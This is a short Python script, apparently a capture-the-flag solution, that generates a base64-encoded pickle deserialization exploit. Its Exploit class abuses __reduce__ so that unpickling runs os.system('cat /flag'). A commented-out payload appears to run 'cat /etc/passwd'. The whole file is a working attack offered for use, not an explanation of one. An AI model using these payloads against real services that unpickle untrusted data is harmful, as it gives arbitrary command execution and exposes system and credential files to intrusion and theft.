#! /usr/bin/python3
import pickle
import os
import base64
import sys


class Exploit:
	def __reduce__(self):
		return os.system,(('cat /flag'),)

# Convert data to a pickle
def impickle(data):
	pickled_data=pickle.dumps(data)
	base64_pickle=base64.b64encode(pickled_data).decode()
	print(base64_pickle)
	

impickle(Exploit())

        
# def unpickle(base64datastring):
# 	# Convert from base64 
# 	b64decoded=base64.b64decode(base64datastring.encode())
# 	# Converting from pickle
# 	unpickled=pickle.loads(b64decoded)
# 	# Printing the result
# 	print(unpickled)

# # Calling the function
# # unpickle('gAN9cQAoWAQAAABOYW1lcQFYDAAAAHRlc3R1c2VybmFtZXECWAMAAABBZ2VxA1gCAAAAMjBxBFgEAAAAcm9sZXEFWAUAAABhZG1pbnEGdS4=')



# impickle(sys.argv[1])
# # impickle(data)
# # print(impickle(payload))
# # (unpickle("gAN9cQAoWAQAAABOYW1lcQFYBQAAAEFsbGFucQJYAwAAAEFnZXEDWAIAAAAyMHEEWAYAAABTY2hvb2xxBVgYAAAARGVkYW4gS2ltYXRoaSBVbml2ZXJzaXR5cQZ1Lg=="))
# # Convert data from a pickle

# # impickle(Exploit())
# # unpickle('gANjcG9zaXgKc3lzdGVtCnEAWA8AAABjYXQgL2V0Yy9wYXNzd2RxAYVxAlJxAy4=')